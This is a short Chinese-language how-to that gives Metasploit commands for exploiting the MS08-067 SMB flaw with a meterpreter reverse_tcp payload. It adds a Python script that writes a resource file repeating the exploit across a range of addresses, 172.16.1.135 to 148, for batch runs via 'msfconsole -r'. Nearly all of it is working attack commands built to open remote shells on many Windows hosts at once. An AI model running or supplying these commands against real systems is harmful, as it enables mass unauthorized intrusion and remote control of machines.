# msconsole-session生成器

```
use exploit/windows/smb/ms08_067_netapi
set payload windows/meterpreter/reverse_tcp
set RHOST 172.16.1.132
set target 34
set LHOST 172.16.1.129
exploit -j
```

### 以上是攻击08_067的步骤

### 写入生成脚本的python

```
f=open("1.sh","w")
for  i in range(135,149):
    f.write(
"""use exploit/windows/smb/ms08_067_netapi
set payload windows/meterpreter/reverse_tcp
set RHOST 172.16.1.%s
set target 34
set LHOST 172.16.1.129
exploit -j
sleep 2
"""%i)
f.close()
```

```
python3 生成 1.sh
```

### 使用msfconsole读取1.sh

```
msfconsole -r 1.sh
```

